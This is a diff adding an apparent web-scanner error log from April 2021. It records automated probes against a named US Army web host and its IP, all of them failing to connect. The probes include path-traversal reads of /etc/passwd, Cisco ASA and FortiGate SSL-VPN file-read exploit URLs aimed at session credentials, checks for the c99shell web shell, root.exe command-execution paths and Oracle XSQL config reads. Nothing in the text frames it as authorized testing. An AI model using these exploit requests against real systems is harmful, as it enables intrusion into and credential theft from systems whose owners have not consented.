@@ -1,0 +1,43 @@
+
+[21-04-09 17:43:57] - uastc.cvs.ellc.learn.army.mil/ - %2e%2e;/test - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:43:58] - uastc.cvs.ellc.learn.army.mil/ - +CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:43:58] - uastc.cvs.ellc.learn.army.mil/ - +CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:43:58] - uastc.cvs.ellc.learn.army.mil/ - ..;/ - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:07] - uastc.cvs.ellc.learn.army.mil/ - js.bak - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:08] - uastc.cvs.ellc.learn.army.mil/ - .LICENSE.bud - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:08] - uastc.cvs.ellc.learn.army.mil/ - .Rbuildignore - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:09] - uastc.cvs.ellc.learn.army.mil/ - .badsegment.log - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:10] - uastc.cvs.ellc.learn.army.mil/ - .cfm - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:16] - uastc.cvs.ellc.learn.army.mil/ - .komodotools/ - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:22] - uastc.cvs.ellc.learn.army.mil/ - .webassets-cache - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:23] - uastc.cvs.ellc.learn.army.mil/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:30] - uastc.cvs.ellc.learn.army.mil/ - SaveForLater.aspx - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:49] - uastc.cvs.ellc.learn.army.mil/ - administracao.php - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:49] - uastc.cvs.ellc.learn.army.mil/ - administracija - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:50] - uastc.cvs.ellc.learn.army.mil/ - administration/Sym.php - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:44:50] - uastc.cvs.ellc.learn.army.mil/ - administration.js - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:01] - uastc.cvs.ellc.learn.army.mil/ - bitrix/settings.bak - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:01] - uastc.cvs.ellc.learn.army.mil/ - bitrix_server_test.log - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:02] - uastc.cvs.ellc.learn.army.mil/ - c99shell.php - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:02] - uastc.cvs.ellc.learn.army.mil/ - ca.crt - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:04] - uastc.cvs.ellc.learn.army.mil/ - etc/passwd - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:17] - uastc.cvs.ellc.learn.army.mil/ - gb_admin.js - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:21] - uastc.cvs.ellc.learn.army.mil/ - msdac/root.exe?/c+dir - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:22] - uastc.cvs.ellc.learn.army.mil/ - js/tiny_mce/ - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:23] - uastc.cvs.ellc.learn.army.mil/ - languages.html - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:25] - uastc.cvs.ellc.learn.army.mil/ - log/error.log - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:26] - uastc.cvs.ellc.learn.army.mil/ - loginsuper - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:27] - uastc.cvs.ellc.learn.army.mil/ - mailadmin - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:34] - uastc.cvs.ellc.learn.army.mil/ - pages/admin/admin-login.html - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:35] - uastc.cvs.ellc.learn.army.mil/ - scripts/root.exe?/c+dir - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:44] - uastc.cvs.ellc.learn.army.mil/ - scripts/ckeditor/ckfinder/core/connector/php/connector.php - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:45] - uastc.cvs.ellc.learn.army.mil/ - secure/downloadFile/ - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:45:45] - uastc.cvs.ellc.learn.army.mil/ - text-base/etc/passwd - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:46:09] - uastc.cvs.ellc.learn.army.mil/ - soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - Cannot connect to: uastc.cvs.ellc.learn.army.mil:80
+[21-04-09 17:46:13] - uastc.cvs.ellc.learn.army.mil/ - remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession - There was a problem in the request to: http://214.48.244.83:80/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+[21-04-09 17:46:13] - uastc.cvs.ellc.learn.army.mil/ - remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd - There was a problem in the request to: http://214.48.244.83:80/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
+[21-04-09 17:46:16] - uastc.cvs.ellc.learn.army.mil/ - servlet/Oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml - There was a problem in the request to: http://214.48.244.83:80/servlet/Oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml
+[21-04-09 17:46:16] - uastc.cvs.ellc.learn.army.mil/ - servlet/Oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - There was a problem in the request to: http://214.48.244.83:80/servlet/Oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
+[21-04-09 17:46:17] - uastc.cvs.ellc.learn.army.mil/ - servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml - There was a problem in the request to: http://214.48.244.83:80/servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml
+[21-04-09 17:46:17] - uastc.cvs.ellc.learn.army.mil/ - servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml - There was a problem in the request to: http://214.48.244.83:80/servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
+[21-04-09 17:46:35] - uastc.cvs.ellc.learn.army.mil/ - xsql/lib/XSQLConfig.xml - There was a problem in the request to: http://214.48.244.83:80/xsql/lib/XSQLConfig.xml
